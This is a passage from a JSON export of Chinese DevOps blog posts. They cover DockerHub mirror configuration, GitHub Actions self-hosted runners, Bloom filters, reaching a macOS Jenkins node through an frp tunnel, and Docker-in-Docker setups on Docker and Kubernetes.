小时内，剩下的拉取次数余额。\n拉取镜像层数据才会消耗余额，因此拉取已经拉取的镜像不会消耗余额。\n使用脚本耗尽配额 1 2 3 4 5 number=1 ; \\ while [[ $number -le 200 ]] ; do \\ docker pull shaowenchen/dockerhub-ratelimit:$number ; \\ ((number = number + 1)) ; \\ done 1 2 3 4 5 number=1 ; \\ while [[ $number -le 200 ]] ; do \\ docker rmi shaowenchen/dockerhub-ratelimit:$number ; \\ ((number = number + 1)) ; \\ done 配置后，继续拉取镜像 这里主要分为三类镜像:\n第一类是本地存在的镜像 1 docker pull shaowenchen/docker-robotframework 第二类是公共镜像（本地不存在） 1 docker pull python 第三类是自己编译的镜像（本地不存在） 1 docker pull shaowenchen/s2ipy 3. 配置镜像源解除拉取限制 3.1 可选镜像源及测试结果 镜像源 是否有效 速度 地址 备注 网易 有 *** https://hub-mirror.c.163.com 腾讯 有 ** https://mirror.ccs.tencentyun.com 速度还行 中科大 有 ** https://ustc-edu-cn.mirror.aliyuncs.com 相当于 Aliyun 的公共镜像源 阿里云 有 ** https://\u0026lt;your_code\u0026gt;.mirror.aliyuncs.com 需要登录，每人一个地址 百度 无 - https://mirror.baidubce.com 不能使用 Azure 无 - https://dockerhub.azk8s.cn 仅允许 Azure 主机使用 网易 无 - https://hub-mirror.c.163.com Daocloud 无 - https://f1361db2.m.daocloud.io 已经缓存的本地镜像也无法拉取 七牛 无 - https://reg-mirror.qiniu.com 总体来看，使用网易或者腾讯的镜像源是个不错的选择。\n3.2 配置方法 编辑 Docker 的 Daemon 文件 1 vim /etc/docker/daemon.json 添加网易的镜像源 1 2 3 4 5 6 { \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://hub-mirror.c.163.com\u0026#34; ], \u0026#34;live-restore\u0026#34;: true } 重启 Docker 服务 1 systemctl daemon-reload \u0026amp;\u0026amp; systemctl restart docker ","description":"","id":261,"section":"post","tags":["博文","Docker","镜像","DockerHub"],"title":"如何绕过 DockerHub 拉取镜像限制","uri":"https://www.chenshaowen.com/blog/how-to-cross-the-limit-of-dockerhub.html"},{"content":" 很多云原生的开源组件是先有服务，后有可视化。今天开了个脑洞，反其道而行，先有可视化交互，再设计底层。\n1. 一张画布搞定半壁云原生 用户只需要一张画布，定义好 Workflow，就可以自由地游走在各种高大上的 Cloud Native 应用之上。\n2. 为什么会这种奇怪的想法 2.1 看看 Istio 这是 Istio 的 Bookinfo 项目。一张画布，拖几个框框，填写几个参数，搞定。\n2.2 看看 Knative 典型的三个应用场景，聚合服务、构建轻量服务、海量按需付费。完事记得关机，省钱。一张画布，拖几个框框，填几个参数，搞定。\n2.3 看看 Tekton 几个 Task 和 Step ，串行执行，典型 CICD 场景。一张画布，拖几个框框，填几个参数，搞定。\n3. 抽象一下 无论是 Serverless 还是 Service Mesh ，都有一个清晰的数据流向。根据数据流向，使用类似 BPMN 这样的工具，就可以对其进行建模，最终图形化展示。\n流程起始于事件，在经过 Workflow 处理之后，将数据转换成底层需要的格式，触发相应的动作。至于是 FaaS 、还是常驻的服务，可以由用户自由选择。\n下图是 BPMN 官网的 Demo，可以作为 Workflow 的画布。\n4. 参考 https://bpmn.io/ ","description":"","id":262,"section":"post","tags":["博文","CloudNative","DevOps","ServiceMesh","Serverless"],"title":"一张画布搞定 DevOps、ServiceMesh、Serverless","uri":"https://www.chenshaowen.com/blog/a-canvas-cover-devops-servicemesh-serverless.html"},{"content":" 对于互联网行业的工程师，常思考的是系统的 Scalable，例如，流量、计算、存储增长时如何改进系统，有各种水平、垂直扩容的方案。除了服务，团队的 Scalable 也是十分关键的。本篇主要思考的是，如何组织团队，在一定规模下，通过加人能够提升团队的事务处理能力。\n1. 人事分离 对于小公司，通常是少数的 Top 员工支撑起整个团队的 KPI 。想要做到人事分离，并不容易。但极度依赖少数员工，对整个团队来说，并不是一种健康的状态。\n人和事情不能绑定在一起。一个人单点处理事务，确实很快，也容易上瘾。用惯了就一直用，熟悉了就沿用惯例。这样其他人就很难接手这类事务，更重要是无法提升其他成员相关的能力。不用等到事务量上去，一旦个人休假或者离开，都会对整个团队都会造成很大影响。\n人事分离，就是要将流程固化，处理事务就是在启动流程。分为下面三个步骤:\n梳理责任线。例如，需要开发 A，运营 B，主播 C。在一条责任线上，处理流程、注意事项、历史事故等，都需要记录在知识库，给出 tasklist、checklist，列出 1、2、3 。\n整理开启流程的原料。例如，直播完了，需要上传视频到 B 站。根据上一步的流程，需要去 Zoom 下载视频、裁减视频、添加 Logo 页、添加水印、添加字幕、导出指定格式、上传视频到 B 站、等待审核、群发通知。在这个流程中，需要登录 Zoom 和 B 站。那么这些账户信息，就需要被记录和授权，同时这些账户应该属于团队而非个人。\n开启流程。有了上面两步的支撑，授权用户都可以开启流程。这样的产出物可能会因为个人能力差异无法保证一致性，但是满足 Scalable 。\n2. 端到端交付 没有交付价值之前，都是无意义的。\n如上图，在一个流程中涉及 A -\u0026gt; B -\u0026gt; C 。很多团队的划分是 A 一个人负责，B 一个人负责，C 一个人负责。这样的架构在互联网公司很难适应，他们没有达成一致的价值交付。A 的价值是交付给 B ，但却忘了只有 C 完成了交付，才能给客户提供价值。同时，在交付要求越来越多的情况下，A、B 都可能不足以支撑 C，而成为瓶颈。\n一个人负责一件足够小的能独立完成的事。如果不能，那么就拆分这个事；如果还是不能，那么劝退这个人。\n一人一事，全程跟进，完成主要的工作，剩下的可以请其他成员协助，而不是要求全能。这并不是一个能力的要求，而是交付意识的要求。在没有上线、没有抵达客户之前，事情就没完，需要不断地关注、改进、推动。\n每个人都实践端到端的交付，在交付增长的情况下，团队加人是可以应对的，满足 Scalable 。\n3. 使用外部服务 在设计软件架构时，有一个优化点就是将存储分离出去，使用第三方提供的存储，这样业务层就可以通过增加副本数，应对增长的流量。\n在组织团队时，也有类似的场景。引用之前的一篇文档: 为什么要使用远端构建 ，下面是其中的一些要点:\n提高自动化水平 有利于其他人参与 版本可追溯、可复现 更低的成本 适合远程办公 使用公共的外部服务，能避免事务对个人的依赖，满足 Scalable 。\n","description":"","id":263,"section":"post","tags":["博文","思考","研发","团队","DevOps"],"title":"构建 Scalable 团队","uri":"https://www.chenshaowen.com/blog/build-a-scalable-team.html"},{"content":"1. 什么是 GitHub Actions 在前面的文档中，我对 GitLab 提供的 CI 功能进行了实践，点击查看 。使用 GitLab 的好处是可以私有化部署、无限的私有仓库数量、CI 配置简单、能接入自建的 Runner 。但随着 GitHub 越来越开放，GitLab 的这些优势在逐步丧失。\n从 CICD 的角度看，越接近 Git 仓库的功能，越贴近开发者。未来的开发者市场上，GitHub、GitLab、Coding、Gitee 这样的 SaaS 平台将具有很顽强的生命力。\nGitHub Actions 是一个类似 GitLab CI 的服务。GitLab 默认使用的是 .gitlab-ci.yml 文件，描述 CICD 流程。而 GitHub 使用的是 .github/workflows 目录下的 yaml 文件。最大的不同在于，GitHub 提供了一个 Actions 市场，开发者可以基于这些原子快速编排流程。\n我在文档 使用镜像部署 Hexo 静态页面 中，使用下面的 yaml 配置进行编译和推送镜像:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 name: build on: [push] jobs: build: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 - name: Build image run: make build - name: Login Registry uses: docker/login-action@v1 with: registry: ghcr.io username: ${{ github.repository_owner }} password: ${{ secrets.GHCR_TOKEN }} - name: Push image run: docker push ghcr.io/shaowenchen/documents:latest 每次 push 代码之后，Actions 就会自动运行，如下图:\n这种方式对开发者十分友好，如果网络通畅，GitHub Actions 能够满足很多团队的 CICD 需求。\n2. 什么时候需要接入自己 Runner 2.1 对构建机器有要求 目前，GitLab 只提供了下面几类运行环境:\nwindows ubuntu macos 但并不是每个版本的系统都支持，目前只能使用指定的版本，也无法指定 CPU 架构。\n另一方面，在构建过程当中，GitHub 提供的构建机，对物理资源也有所限制。构建虚拟机的配置如下:\n2 core CPUs 7 GB of RAM memory 14 GB of SSD disk space 可能在未来，相关的物理资源配置会有所提升，但始终会有限制。当需要构建某些大型项目，特别是 C++ 项目时，这样的物理资源配置是不能够满足要求的。\n2.2 私有仓库需要大量构建 下图是目前 GitHub 官方给出的构建报价:\n非常幸运的是公开仓库免费使用，只有私有仓库的额度有限制。不同付费级别的用户，具有不同的构建时长。需要注意的是，这里的时长指的是 Linux 的构建时长。Windows 使用一分钟，折算为 Linux 的两分钟。MacOS 使用一分钟，折算为 Linux 的十分钟。\n对私有仓库有大量构建需求的项目，使用 GitHub Actions 提供的构建机性价比不高。\n3. 添加主机 Runner 这里的 Runner 指的是 GitHub Actions 的运行环境，也就是 .github/workflows 文件夹下 yaml 中指令的运行环境。这里主要添加主机 Runner，如果是添加容器或者 Kubernetes Runner ，需要将 actions-runner 打包到镜像中，然后运行接入 GitHub Actions，在其他方面没有差别。\n首先进入项目，在 Settings 页面中，找到 Actions 。\n点击上图的 Add runner 进入下图的添加主机页面，同样支持三种操作系统，macOS、Linux、Windows。\n在页面选择操作系统和架构之后，按照安装提示操作即可。\n新建用户 runner:runner 1 2 3 4 groupadd -g 1234 runner useradd runner -u 1234 -g 1234 su runner cd ~ 下载 Runner 1 2 3 mkdir actions-runner \u0026amp;\u0026amp; cd actions-runner curl -O -L https://github.com/actions/runner/releases/download/v2.274.2/actions-runner-linux-x64-2.274.2.tar.gz tar xzf ./actions-runner-linux-x64-2.274.2.tar.gz 配置 Runner 在这一步中，可能需要根据提示。执行命令 su root，切换到 root 用户，执行 ./bin/installdependencies.sh 安装依赖。\n执行 config.sh 开始配置:\n1 ./config.sh --url https://github.com/shaowenchen/pipeline-test --token AKNLJON6JWRTO35GV3PXGVS7ZHPZO 根据命令的提示，进行如下交互:\nEnter the name of runner: [press Enter for node1] mycentos This runner will have the following labels: \u0026#39;self-hosted\u0026#39;, \u0026#39;Linux\u0026#39;, \u0026#39;X64\u0026#39; Enter any additional labels (ex. label-1,label-2): [press Enter to skip] centos √ Runner successfully added √ Runner connection is good # Runner settings Enter name of work folder: [press Enter for _work] /home/runner/workspaces √ Settings Saved. 运行 Runner 1 ./run.sh 页面查看 Runner 在 GitHub 的 Actions 页面可以看到新增加的 Runner。\n4. 使用测试 添加 workflows 文件 在项目 master 分支，增加文件 .github/workflows/blank.yml ，内容如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 name: CI on: push: branches: [ master ] jobs: hello: runs-on: self-hosted steps: - uses: actions/checkout@v2 - name: Run a multi-line script run: | date uname -a 查看运行结果 提交文件之后，Actions 马上就会开始运行，执行结果如下图:\n查看节点上的 workspaces 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 tree -L 3 /home/runner/workspaces/ /home/runner/workspaces/ |-- _actions | `-- actions | `-- checkout |-- _PipelineMapping | `-- shaowenchen | `-- pipeline-test |-- pipeline-test | `-- pipeline-test | |-- a | |-- choice | |-- deploy | |-- Jenkinsfile | |-- plain-credential | `-- readme.md |-- _temp `-- _tool 从 workspaces 中的文件可以看到，Actions 将代码 checkout 到主机上，然后在主机上执行了编排命令。\n5. 参考 https://github.com/features/actions https://docs.github.com/en/free-pro-team@latest/actions/hosting-your-own-runners/about-self-hosted-runners ","description":"","id":264,"section":"post","tags":["博文","GitHub","CICD","DevOps","工具","研发"],"title":"如何给 GitHub Actions 添加自己的 Runner 主机","uri":"https://www.chenshaowen.com/blog/how-to-add-self-hosted-runners-to-github-action.html"},{"content":"1. 什么是布隆过滤 布隆过滤（Bloom Filter）是布隆在 1970 年提出的一种数据结构。\n将元素（x、y、z）通过一系列函数，映射到一个二进制向量（0101 序列），用于快速判断元素 w 是否在一个集合当中。如下图（来自维基百科）:\n相较于使用单个映射函数，在相同的地址空间下，多个映射函数能降低冲突率。因此，在相同冲突率下，多个映射函数比单个映射函数需要的地址空间更少。\nBloom Filter 使用很短的二进制向量，通过牺牲准确率获得了极高的空间利用率。在大规模数据查询场景下，能有效避免磁盘 IO，具有很高地查询效率。\n其实，用于判断一个元素是否在一个大集合中，还可以使用 Bitmap 。将元素转换成整数类型 x ，x 在 Bitmap 中的索引值为 0（代表不存在） 或者 1（代表存在）。\nBloom Filter 和 Bitmap 有所类似，都是利用二进制向量和映射函数判断元素是否存在。不同的是，Bitmap 只有一个映射函数，向量大小不能小于最大的整数；Bloom Filter 具有多个映射函数，根据不同要求的误判率场景，可以选择不同大小的二进制向量。\n2. 常见的应用场景 Bloom Filter 具有一定的误判率，主要解决一定不存在和可能存在两类问题。\n2.1 一定不存在问题 - False 单词拼写检查。拼写错误的单词一定不存在 防止数据库穿库。查询不存在的行或者列 缓存穿透。没查询到缓存时，穿透到数据库 2.2 可能存在 - True 爬虫对 URL 去重。跳过已经抓取的 URL 垃圾邮件过滤。黑名单中的地址将被屏蔽 避免重复推荐文章。跳过已经阅读的文章 URL/ID Web 拦截器。拦截在黑名单中的 URL 地址 3. 布隆过滤的参数选择 上面提到 ，根据不同要求的误判率场景，布隆过滤可以选择不同大小的二进制向量。在生产过程中，我们需要平衡误判率和效率。下面是维基百科中给出的公式:\nk = (m/n) ln2\n其中，\nm 是二进制向量的大小 n 是元素的数量 k 是映射函数的个数 ln2 是常数，约等于 0.69 下表是不同 m/n 和 k 下的误判率。\nm/n k k=1 k=2 k=3 k=4 k=5 k=6 k=7 k=8 2 1.39 0.393 0.400 3 2.08 0.283 0.237 0.253 4 2.77 0.221 0.155 0.147 0.160 5 3.46 0.181 0.109 0.092 0.092 0.101 6 4.16 0.154 0.0804 0.0609 0.0561 0.0578 0.0638 7 4.85 0.133 0.0618 0.0423 0.0359 0.0347 0.0364 8 5.55 0.118 0.0489 0.0306 0.024 0.0217 0.0216 0.0229 9 6.24 0.105 0.0397 0.0228 0.0166 0.0141 0.0133 0.0135 0.0145 10 6.93 0.0952 0.0329 0.0174 0.0118 0.00943 0.00844 0.00819 0.00846 11 7.62 0.0869 0.0276 0.0136 0.00864 0.0065 0.00552 0.00513 0.00509 12 8.32 0.08 0.0236 0.0108 0.00646 0.00459 0.00371 0.00329 0.00314 13 9.01 0.074 0.0203 0.00875 0.00492 0.00332 0.00255 0.00217 0.00199 14 9.7 0.0689 0.0177 0.00718 0.00381 0.00244 0.00179 0.00146 0.00129 15 10.4 0.0645 0.0156 0.00596 0.003 0.00183 0.00128 0.001 0.000852 16 11.1 0.0606 0.0138 0.005 0.00239 0.00139 0.000935 0.000702 0.000574 17 11.8 0.0571 0.0123 0.00423 0.00193 0.00107 0.000692 0.000499 0.000394 18 12.5 0.054 0.0111 0.00362 0.00158 0.000839 0.000519 0.00036 0.000275 19 13.2 0.0513 0.00998 0.00312 0.0013 0.000663 0.000394 0.000264 0.000194 20 13.9 0.0488 0.00906 0.0027 0.00108 0.00053 0.000303 0.000196 0.00014 21 14.6 0.0465 0.00825 0.00236 0.000905 0.000427 0.000236 0.000147 0.000101 22 15.2 0.0444 0.00755 0.00207 0.000764 0.000347 0.000185 0.000112 7.46e-05 23 15.9 0.0425 0.00694 0.00183 0.000649 0.000285 0.000147 8.56e-05 5.55e-05 24 16.6 0.0408 0.00639 0.00162 0.000555 0.000235 0.000117 6.63e-05 4.17e-05 25 17.3 0.0392 0.00591 0.00145 0.000478 0.000196 9.44e-05 5.18e-05 3.16e-05 26 18 0.0377 0.00548 0.00129 0.000413 0.000164 7.66e-05 4.08e-05 2.42e-05 27 18.7 0.0364 0.0051 0.00116 0.000359 0.000138 6.26e-05 3.24e-05 1.87e-05 28 19.4 0.0351 0.00475 0.00105 0.000314 0.000117 5.15e-05 2.59e-05 1.46e-05 29 20.1 0.0339 0.00444 0.000949 0.000276 9.96e-05 4.26e-05 2.09e-05 1.14e-05 30 20.8 0.0328 0.00416 0.000862 0.000243 8.53e-05 3.55e-05 1.69e-05 9.01e-06 31 21.5 0.0317 0.0039 0.000785 0.000215 7.33e-05 2.97e-05 1.38e-05 7.16e-06 32 22.2 0.0308 0.00367 0.000717 0.000191 6.33e-05 2.5e-05 1.13e-05 5.73e-06 在使用时，首先确定一个可接受的误判率，然后根据公式计算出二进制向量的大小:\nm = (k * n) / ln2\n例如，选择 0.003 的误判率，k = 4，m/n = 15 。如果有 100 W 条记录，那么需要二进制向量大小为 ( 4 * 10e6 ) / 0.693 ≈ 5.77 * 10e6 bit = 704.6 KB 。\n4. 布隆过滤的缺点 布隆过滤的主要缺点:\n无法删除元素。因为一个二进制向量位，可能对应多个元素的映射，不能直接将其置 0 。 只适用于单机系统，内存开销随数据规模成线性关系。目前已经有一些中间件提供了布隆过滤，比如 Redis ，可以用于超大规模数据的场景。 对布隆过滤的优化算法很多，无非就是增加信息的冗余，但从效率上都比不上布隆过滤。下面是几种同类算法:\n计数布隆过滤(Counting Bloom Filter) 在标准布隆过滤的基础上，将每一个 Bit 改为一个计数器，增加一个元素时，计数加一，删除一个元素时，计数减一。\nSpectral Bloom Filters 上面的计数布隆过滤，计数器是固定位数的。Spectral Bloom Filters 的计数位是动态变化的，更加灵活，避免计数溢出。\n压缩布隆过滤（Compressed Bloom Filters） 通过减少映射函数的数量，减少网络传输的 Bit 位。为了换取相同的误判率，二进制向量将会变大。\nD-left 计算布隆过滤（D-left Counting Bloom Filters） 基于 D-left Hashing ，减少了存储空间，降低了误判率，可以删除元素。\nDynamic Counting Filters 支持查询元素的存储频率\n布谷鸟过滤 布谷鸟算法不同于布隆过滤，而是模仿布谷鸟解决映射冲突问题。当不同元素因素到同一个映射位时，最后映射的元素会踢走之前映射的元素。\n布谷鸟算法支持删除操作，空间利用率只有 50 %，只存储元素的指纹信息，查询效率很高。\n5. Go 语言实现 这里引用 github.com/willf/bloom ，对 Bloom Filter 进行简单测试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/willf/bloom\u0026#34; ) func main() { n := uint(10000) error_rate := 0.003 need_m, need_k := bloom.EstimateParameters(n, error_rate) fmt.Printf(\u0026#34;Set m = %d , k = %d \\n\u0026#34;, need_m, need_k) filter := bloom.New(need_m, need_k) for i := 0; i \u0026lt; int(n); i++ { filter.Add([]byte(fmt.Sprintf(\u0026#34;https://www.chenshaowen.com/%d\u0026#34;, i))) } fmt.Println(filter.Test([]byte(fmt.Sprintf(\u0026#34;https://www.chenshaowen.com/%d\u0026#34;, 10000)))) fmt.Printf(\u0026#34;Done\u0026#34;) } 执行结果:\n1 2 3 Set m = 120910 , k = 9 false Done 6. 参考 http://pages.cs.wisc.edu/~cao/papers/summary-cache/node8.html https://en.wikipedia.org/wiki/Bloom_filter https://github.com/willf/bloom ","description":"","id":265,"section":"post","tags":["博文","实用的算法","研发","Go","优化","布隆过滤"],"title":"实用的算法之布隆过滤","uri":"https://www.chenshaowen.com/blog/practical-algorithm-of-bloom-filter.html"},{"content":"揭秘《DevOps 能力成熟度模型》\n研发运营(DevOps)解决方案能力分级要求 - PDF 下载\n第1部分：总体架构 - PDF 下载\n第2部分：敏捷开发管理过程 - PDF 下载\n第3部分：持续交付过程 - PDF 下载\n第4部分：技术运营 - PDF 下载\n第5部分：应用设计 - PDF 下载\n第6部分：安全及风险管理 - PDF 下载\n","description":"","id":266,"section":"post","tags":["整理","DevOps","标准","模型"],"title":"《DevOps 能力成熟度模型》下载","uri":"https://www.chenshaowen.com/blog/capability-maturity-model-of-devops.html"},{"content":" 本文同样适用于接入 ARM、MIPS 架构，FreeBSD、Windows 系统的物理机，如果 Jenkins 能连上构建机，可以跳过 Frp 部分。\n1. 遇到的问题 在以 Kubernetes 为基础设施的场景下，Jenkins 构建流水线时，将为每一条流水线单独创建一个 Pod 用于构建。Pod 中的容器环境可以根据需要自定义设置，扩展非常方便，能够满足绝大多数的需求。\n其中有一个特例，那就是构建苹果生态链的应用，例如 IOS、macOS 应用。由于没有 macOS 的容器镜像，只能采用物理机进行构建。还有一种方式是，将 macOS 安装在虚拟机中，将虚拟机接入 Jenkins 进行构建，当然也可以直接导入其他人共享的 macOS VM 。\n这都会遇到一个问题，那就是 Jenkins Master 无法直接访问 macOS 系统，网络不通，无法添加 macOS 的构建节点。\n本篇主要是以 Frp 作为穿透工具，打通网络，对 IOS 应用、macOS 应用提供 Jenkins 流水线构建的解决方案。\n2. 解决方案 如下图，通过 Frp 可以打通 Jenkins 与物理机之间的网络。\n第一步，需要将 Frp 的 Server 端部署到 Jenkins Master 可以直接访问的环境上，这些环境包括物理机、VM、容器环境。 第二步，在 Mac 物理机上运行 Frp Client ，将 macOS 的 SSH 服务暴露在 Frp Server 上。 第三步，在 Jenkins 上添加 macOS 节点，使用 Label 选择 Mac 机器进行构建。 3. 配置相关组件 3.1 macOS 系统配置 下图是我测试的 macOS 系统版本:\n关闭防火墙 在系统设置中，找到【Sharing】，打开 Remote Login。 这一步是为了 Jenkins Master 能够远程登录到 macOS 上。这里的 172.31.140.36 是内网的 IP，Jenkins 无法直接访问。\n3.2 搭建并配置 Frp 服务 Frp 服务端和客户端的配置，请参考文档 使用 frp 将本地服务发布到公网。\n下面贴出的是客户端的配置：\n1 2 3 4 5 6 7 8 9 10 [common] server_addr = 139.198.120.81 server_port = 5443 token = xxxxxxxxxxxx [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 2222 这里将本地的 macOS 的 22 端口映射到公网 139.198.120.81:2222 上。\n执行命令启动 Frp 客户端。如果是生产环境，需要托管这个服务。\n1 ./frpc -c ./frpc.ini 启动之后，会弹框报错，截图如下：\n需要去系统设置-\u0026gt;安全与隐私中，解锁运行权限，再运行 Frp 。下图中，由于已经允许，因此并没有出现 Frp 相关的提示字样。\n再次执行 ./frpc -c ./frpc.ini ，弹框会新增 Open 选项。\n点击 Open 之后，可以看到 Frp 客户端已经正常运行。\n1 2 3 2020/11/22 08:59:06 [I] [service.go:288] [97da648b05e7e343] login to server success, get run id [97da648b05e7e343], server udp port [0] 2020/11/22 08:59:06 [I] [proxy_manager.go:144] [97da648b05e7e343] proxy added: [ssh] 2020/11/22 08:59:06 [I] [control.go:180] [97da648b05e7e343] [ssh] start proxy success 3.3 Jenkins 新增节点配置 Jenkins 中的配置主要分为如下几步：\n进入 Jenkins 后台的节点管理页面 新增 OSX 节点，勾选 Permanent Agent 配置节点信息 如图进行配置，Host 设置为 Frp Server 的地址，点击【高级】，可以配置 SSH 的端口号为 2222 。\n这里需要添加一个凭证，用于登录 macOS 。为了简便，我直接使用的是账户和密码。如果对安全有较高要求，可以使用 SSH Key 进行认证。\n启动节点并查看节点列表 上一步完成之后，节点默认会直接启动，也就是初始化节点，运行一个进程，用于与 Master 通信。\n在初始化的过程中，在 macOS 系统上，会出现授权的弹框。如下图，点击 Open 。\n返回节点列表页面，将会看到 macOS 节点。\n查看 Mac 物理机上初始化文件 回到 macOS 上，可以看到工作目录下面，初始化了一系列文件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 cd /Users/shaowenchen/Downloads tree -L 3 . ├── remoting │ ├── jarCache │ └── logs │ ├── remoting.log.0 │ └── remoting.log.0.lck ├── remoting.jar └── support └── all_2020-11-22_01.07.11.log 4. 测试流水线 创建自由风格的流水线，粘贴如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 pipeline { agent { node { label \u0026#39;osx\u0026#39; } } stages { stage(\u0026#39;get env info\u0026#39;) { steps { sh \u0026#39;uname -a\u0026#39; } } stage(\u0026#39;upload file\u0026#39;) { steps { sh \u0026#34;echo `date` \u0026gt;\u0026gt; newfile.txt\u0026#34; } post { success { archiveArtifacts \u0026#39;newfile.txt\u0026#39; } } } } } 执行完成之后，可以看到如下结果:\n在 macOS 的工作目录中，可以查看到相关的工作目录和文件:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 tree -L 3 . ├── newfile.txt ├── remoting │ ├── jarCache │ └── logs │ ├── remoting.log.0 │ ├── remoting.log.0.1 │ ├── remoting.log.1 │ ├── remoting.log.2 │ └── remoting.log.3 ├── remoting.jar ├── support │ ├── all_2020-11-22_01.07.11.log │ ├── all_2020-11-22_01.30.36.log │ └── all_2020-11-22_01.35.10.log └── workspace ├── aaaak2c24 │ ├── a │ └── a@tmp ├── osx └── osx@tmp 从结果看，流水线在 macOS 执行命令之后，归档了构建产物，符合预期。这里如果是 IOS 构建，只需要在 macOS 系统上安装 XCode 工具，在流水线中执行构建，归档之后，同样能下载到 IOS 安装包。\n","description":"","id":267,"section":"post","tags":["博文","Jenkins","macOS","CICD","CI","DevOps"],"title":"如何接入远程 macOS 物理机进行 Jenkins 流水线构建","uri":"https://www.chenshaowen.com/blog/how-to-run-the-pipeline-on-remote-osx.html"},{"content":"1. 典型适用场景 在 CI 中，通常会有一个 CI Engine 负责解析流程，控制整个构建过程，而将真正的构建交给 Agent 去完成。例如，Jenkins 、GitLab 均是如此。\n如下图, 连接 CI Engine 的 Agent, 种类很多。这是为了满足不同项目对构建环境的要求。\n同时 Agent 是动态的，构建时才需要，构建完成时即销毁。CI 非常适合实践容器、Serverless 等技术，因此在生产过程中 Agent 经常是容器化的。\n那么问题就来了？如果 CI Engine 也是容器化的，在容器中如何使用 Agent 容器去构建呢？如果 Agent 已经是容器化的，那么在 Agent 上如何构建镜像呢？这就是本篇将给出的回答，如何在 Docker 中使用 Docker。\n2. 两种使用模式 我们需要知道 Docker 以 C/S 模式工作，主要分为两个部分，Docker CLI 和 Docker Daemon 。Docker CLI ，也就是客户端，提供给用户命令行操作 Docker，例如 docker create/images/ps 等。Docker Damon ，也就是守护进程，负责接受用户指令，维护容器的生命周期。\n2.1 Docker in Docker Docker in Docker ，以下简称 DinD 。\n如上图，可以在 Container 中直接运行一个 Docker Daemon ，然后使用 Container 中的 Docker CLI 工具操作容器。\n这种方式下，容器中的 Docker Daemon 完全独立于外部，具有良好的隔离特性。看起来，Container 类似一个 VM ，但 DinD 的作者自己也不是很推荐。\n主要原因还是安全问题。DinD 需要以特权模式启动，这种嵌套会带来潜在的安全风险。\n这种方式下，响应命令的容器嵌套于使用 docker 命令的容器。\n2.2 Docker outside of Docker Docker outside of Docker ，以下简称 DooD 。\n如上图，Docker 以 C/S 模式工作，使用时用户关注的是 C 端，而生命周期的管理在 S 端。\n因此，只需要将 Container 的外部 Docker Daemon 服务挂载到 Container 。让 Container 误以为本地运行了 Docker Daemon，使用 Docker CLI 命令操作时，外部的 Docker Daemon 会响应请求。\n这种方式下，响应命令的容器与使用 docker 命令的容器处于同一层级。\n3. Docker 环境下的演示 3.1 DinD 运行 DinD 容器 1 2 3 docker run --privileged -e DOCKER_TLS_CERTDIR=\u0026#34;\u0026#34; -d --name dockerd docker:dind d6414f2ff0076c42de19a8a1fe122481c1a72b3bd45fd490dbe1c427414b4139 运行带 CLI 的容器链接 DinD 容器 1 docker run --rm -it --link dockerd:docker docker:latest sh 在 DinD 容器中，拉取镜像 拉取镜像\n1 docker pull shaowenchen/devops-java-sample 查看镜像\n1 2 3 4 docker images REPOSITORY TAG IMAGE ID CREATED SIZE shaowenchen/devops-java-sample latest fa4651c24a18 6 weeks ago 122MB 使用起来和一个独立的 Docker Daemon 环境一样。\n查看外部是否受影响 键入 exit 退出容器，通过主机上的 Docker Daemon\n1 docker images |grep fa4651c24a18 符合预期。DinD 使用的是独立的 Docker Daemon，对外部的实例没有直接影响。\n3.2 DooD 运行一个容器 1 docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh 安装 curl 这里为了避免安装 Docker CLI ，直接使用 curl 调用 Docker Daemon 的 API。\n1 apk update \u0026amp;\u0026amp; apk add curl 拉取镜像 1 2 3 4 curl -XPOST --unix-socket /var/run/docker.sock http://localhost/images/create?fromImage=shaowenchen/docker-robotframework\u0026amp;tag=latest ... {\u0026#34;status\u0026#34;:\u0026#34;Status: Downloaded newer image for shaowenchen/docker-robotframework\u0026#34;} 查看拉取的镜像 键入 exit 退出容器，通过主机上的 Docker Daemon\n1 2 3 docker images |grep robotframework shaowenchen/docker-robotframework latest d99cfa7ee716 12 months ago 1.5GB 符合预期。DooD 方式直接使用的外部 Docker Daemon。\n4. Kubernetes 环境下的演示 4.1 DinD 创建一个 dind.yaml 文件，内容如下: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 apiVersion: apps/v1 kind: Deployment metadata: name: dind spec: replicas: 1 selector: matchLabels: app: dind template: metadata: labels: app: dind spec: containers: - name: dockerd image: \u0026#39;docker:dind\u0026#39; env: - name: DOCKER_TLS_CERTDIR value: \u0026#34;\u0026#34; securityContext: privileged: true - name: docker-cli image: \u0026#39;docker:latest\u0026#39; env: - name: DOCKER_HOST value: 127.0.0.1 command: [\u0026#34;/bin/sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;sleep 86400;\u0026#34;] 创建 Deployment 1 kubectl apply -f dind.yaml 查看创建的 Pod 名 1 2 3 kubectl get pod |grep dind dind-5446ffbc8d-68q28 2/2 Running 0 12s 进入 Pod 1 kubectl exec -it dind-5446ffbc8d-68q28 -c docker-cli sh 测试是否使用独立的 Docker Daemon 1 docker pull nginx 1 2 3 4 docker images REPOSITORY TAG IMAGE ID CREATED SIZE nginx latest daee903b4e43 3 days ago 133MB 符合预期，这里仅显示了刚拉取的 Nginx 的镜像，完全独立于主机的 Docker Daemon。\n4.2 DooD 创建一个 dood.yaml 文件，内容如下: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 apiVersion: apps/v1 kind: Deployment metadata: name: dood spec: replicas: 1 selector: matchLabels: app: dood template: metadata: labels: app: dood spec: containers: - image: docker:latest name: docker-cli securityContext: privileged: false command: [\u0026#34;/bin/sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;sleep 